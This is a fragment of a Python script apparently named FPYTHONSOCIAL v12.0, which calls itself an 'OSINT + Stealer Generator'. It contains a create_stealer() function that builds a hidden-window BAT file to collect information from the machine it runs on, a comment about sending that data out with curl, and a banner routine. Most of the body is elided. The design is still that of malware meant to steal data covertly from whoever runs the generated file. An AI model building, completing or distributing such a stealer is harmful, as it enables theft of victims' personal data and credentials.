#!/usr/bin/env python3
# FPYTHONSOCIAL v12.0 – OSINT + Stealer Generator (bat, hidden window, no Telegram open)
...
def create_stealer():
    ...
    print(f"{PURPLE_DIM}  ВНИМАНИЕ: Этот инструмент создаёт BAT-файл для сбора информации.{RESET}")
...
:: Отправка через curl (встроен в Windows 10/11)
...
def print_header():
    ...
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
    print(f"{PURPLE_BOLD}   FPYTHONSOCIAL v12.0     {PURPLE_DIM}by {AUTHOR}{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
